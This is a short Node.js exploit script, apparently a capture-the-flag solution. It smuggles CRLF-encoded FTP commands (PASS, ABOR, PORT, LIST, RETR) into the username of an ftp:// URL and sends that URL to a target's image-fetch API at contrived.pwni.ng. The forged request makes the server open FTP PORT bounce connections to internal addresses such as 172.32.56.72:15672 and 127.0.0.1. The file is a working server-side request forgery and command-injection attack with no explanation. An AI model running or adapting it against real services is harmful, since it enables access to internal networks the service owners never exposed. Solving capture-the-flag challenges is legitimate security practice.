const Ftp = require("ftp");
const fetch = require("isomorphic-fetch");

const streamToBuffer = (stream) => {
    return new Promise((resolve, reject) => {
        let result = Buffer.from([]);
        stream.on("data", (data) => {
            result = Buffer.concat([result, Buffer.from(data)]);
        });
        stream.on("end", () => resolve(result));
    });
}


const connectFtp = async (args) => {
    let ftpInst = await new Promise((resolve, reject) => {
        const client = new Ftp();
        client.on("ready", () => resolve(client));
        client.on("error", (e) => reject(e));
        client.connect(args);
    });

    return {
        get: (path) =>
            new Promise((resolve, reject) =>
                ftpInst.get(path, (err, data) =>
                    err ? reject(err) : resolve(streamToBuffer(data)))),
        put: (path, data) =>
            new Promise((resolve, reject) =>
                ftpInst.put(data, path, (err) => err ? reject(err) : resolve())),
        mkdir: (path) =>
            new Promise((resolve, reject) =>
                ftpInst.mkdir(path, true, (err) => err ? reject(err) : resolve())),
    };
}

const main = async function(){
    //PORT_LINE = "PORT 13,233,55,1xx,0,80"
    PORT_LINE = "PORT 172,32,56,72,0,15672"
    //PORT_LINE = "PORT 127,0,0,1,0,8002"
    commands = [
        //"DELE zevtnax",
        "PASS test",
        "ABOR",
        "ABOR",
        "ABOR",
        //PORT_LINE,
        "PORT 127,0,0,1,0,8009",
        "LIST",
        PORT_LINE,
        "RETR zevtnax",
    ]
    command_str = commands.map(x=>encodeURIComponent(x)).join("%0d%0a")
    const filename = "zevtnax"
    const url = "ftp://user%0d%0a" + command_str + ":test@ftp:21/" + filename
    console.log(url)
    console.log(encodeURI(url))

    //await fetch("http://localhost:8080/api/image?url=" + encodeURI(url));
    await fetch("http://contrived.pwni.ng/api/image?url=" + encodeURI(url));
}

main()

